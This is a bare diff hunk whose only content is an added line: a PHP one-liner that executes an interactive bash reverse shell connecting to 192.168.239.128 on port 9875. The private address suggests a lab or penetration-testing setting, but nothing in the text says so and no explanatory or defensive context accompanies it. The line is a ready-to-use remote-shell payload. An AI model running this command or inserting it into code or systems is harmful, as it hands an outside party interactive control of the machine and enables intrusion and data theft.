@@ -1,0 +1,1 @@
+php -r 'exec("/usr/bin/bash -i >& /dev/tcp/192.168.239.128/9875 0>&1");'
